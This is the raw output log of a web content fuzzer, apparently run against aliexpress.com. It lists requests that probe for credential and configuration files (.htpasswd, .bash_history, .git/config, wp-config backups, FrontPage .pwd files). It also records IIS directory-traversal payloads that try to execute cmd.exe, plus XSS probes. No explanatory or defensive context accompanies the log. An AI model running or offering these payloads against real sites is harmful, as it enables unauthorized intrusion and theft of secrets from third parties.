

https://aliexpress.com  StandardStatus= 301   chars_in_result= 357
00045:  C=200      3 L	       4 W	     72 Ch	  ".well-known/assetlinks.json"
00001:  C=200     11 L	      15 W	    574 Ch	  ".bash_history"
00037:  C=200     11 L	      15 W	    576 Ch	  ".svn/entries"
00025:  C=200     11 L	      15 W	    566 Ch	  ".htpasswd"
00002:  C=200     11 L	      15 W	    562 Ch	  ".bashrc"
00024:  C=200     11 L	      15 W	    566 Ch	  ".htaccess"
00011:  C=200     11 L	      15 W	    574 Ch	  ".git/config"
00444:  C=200     11 L	      15 W	    610 Ch	  "_vti_bin/_vti_adm/admin.dll"
02572:  C=200     11 L	      15 W	    564 Ch	  "main.mdb"
03640:  C=200     11 L	      15 W	    560 Ch	  "script"
04168:  C=302      8 L	      26 W	    258 Ch	  "tncms"
04971:  C=200     11 L	      15 W	    586 Ch	  "wp-config.php.stage"
05250:  C=200     11 L	      15 W	    698 Ch	  "..%255c..%255c..%255c..%255cwinnt/system32/cmd.exe?/c+dir"
05346:  C=200     11 L	      15 W	    720 Ch	  "_mem_bin/..%255c..%255c..%255c..%255cwinnt/system32/cmd.exe?/c+dir"
05289:  C=200     11 L	      15 W	    608 Ch	  "cgi-bin/imagemap.exe?2,2"
05287:  C=200     11 L	      15 W	    606 Ch	  "cgi-bin/htimage.exe?2,2"
05282:  C=200     11 L	      15 W	    714 Ch	  "cfide/..%255c..%255c..%255c..%255cwinnt/system32/cmd.exe?/c+dir"
05288:  C=200     11 L	      15 W	    588 Ch	  "cgi-bin/htmlscript"
05286:  C=200     11 L	      15 W	    608 Ch	  "cgi-bin/a1stats/a1disp.cgi"
05285:  C=200     11 L	      15 W	    568 Ch	  "cgi-bin/"
05381:  C=400      0 L	       0 W	      0 Ch	  "scripts/..%c0%af../winnt/system32/cmd.exe?/c+dir+c:\\"
05375:  C=400      0 L	       0 W	      0 Ch	  "~/<script>alert('XSS')</script>.asp"
05376:  C=400      0 L	       0 W	      0 Ch	  "~/<script>alert('XSS')</script>.aspx"
05377:  C=400      0 L	       0 W	      0 Ch	  "<script>alert('XSS')</script>.aspx"
05356:  C=400     25 L	      69 W	    706 Ch	  "%NETHOOD%/"
05379:  C=200     11 L	      15 W	    718 Ch	  "scripts/..%255c..%255c..%255c..%255cwinnt/system32/cmd.exe?/c+dir"
05437:  C=200     11 L	      15 W	    588 Ch	  "_vti_pvt/users.pwd"
05434:  C=200     11 L	      15 W	    592 Ch	  "_vti_pvt/authors.pwd"
05352:  C=200     11 L	      15 W	    714 Ch	  "msadc/..%255c..%255c..%255c..%255cwinnt/system32/cmd.exe?/c+dir"
05435:  C=200     11 L	      15 W	    592 Ch	  "_vti_pvt/service.pwd"
05432:  C=200     11 L	      15 W	    604 Ch	  "_vti_pvt/administrator.pwd"
05433:  C=200     11 L	      15 W	    606 Ch	  "_vti_pvt/administrators.pwd"
05422:  C=200     11 L	      15 W	    658 Ch	  "_vti_bin/fpcount.exe?Page=default.asp|Image=3"
05425:  C=200     11 L	      15 W	    614 Ch	  "_vti_bin/shtml.exe/qwertyuiop"
05421:  C=200     11 L	      15 W	    720 Ch	  "_vti_bin/..%255c..%255c..%255c..%255cwinnt/system32/cmd.exe?/c+dir"
